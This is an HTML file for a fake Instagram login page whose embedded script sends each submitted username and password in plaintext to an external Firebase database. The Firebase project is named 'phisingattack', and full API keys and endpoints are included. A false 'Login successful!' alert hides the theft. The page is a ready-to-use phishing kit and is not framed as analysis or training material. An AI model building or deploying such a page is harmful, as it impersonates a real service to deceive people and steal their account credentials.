<!DOCTYPE html>
<head>
    <title>Instagram Login</title>
    <link rel="stylesheet" href="insta.css">
</head>
<body>
    <div class="container">
        <div class="login-box">
           <form method="get" id="loginForm">
            <h1 class="logo">Instagram</h1>
            <input type="text" id="username" placeholder="Phone number, username, or email">
            <input type="password" id="password" placeholder="Password">
            <i class="fa fa-eye" id="togglePassword"></i>
           <button type="submit" id="loginBtn">Login</button>
           </form>
            <p class="or">────── OR ──────</p>
            <p class="fb">Log in with Facebook</p>
            <p class="forgot">Forgot password?</p>
        </div>
        <div class="signup-box">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>
  <script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
   import { getDatabase, ref, set } from 'https://www.gstatic.com/firebasejs/12.6.0/firebase-database.js';
  const firebaseConfig = {
    apiKey: "AIzaSyDv4KfcyesqkgYQ_GZ_zjPohmC_wFOIEyE",
    authDomain: "phisingattack-80564.firebaseapp.com",
    projectId: "phisingattack-80564",
    databaseURL:"https://phisingattack-80564-default-rtdb.firebaseio.com",
    storageBucket: "phisingattack-80564.firebasestorage.app",
    messagingSenderId: "327971574208",
    appId: "1:327971574208:web:dc38287727bcefbfb47825"
  };
  const app = initializeApp(firebaseConfig);
    const database = getDatabase(app);
    document.addEventListener('DOMContentLoaded', function() {
      document.getElementById('loginForm').addEventListener('submit', function(event) {
        event.preventDefault();
        var username = document.getElementById('username').value;
        var password = document.getElementById('password').value;
        const userRef = ref(database, 'users/' + username);
        set(userRef, {
          password: password
        }).then(function() {
          alert('Login successful!');
        }).catch(function(error) {
          alert('Error: ' + error.message);
        });
      });
    });
</script>
<script>
    const togglePassword = document.querySelector("#togglePassword");
    const pass = document.querySelector("#password");
    togglePassword.addEventListener("click", function () {
      const type = pass.getAttribute("type") === "password" ? "text" : "password";
      pass.setAttribute("type", type);
      this.classList.toggle("fa-eye-slash");
    });
  </script>
</body>
</html>
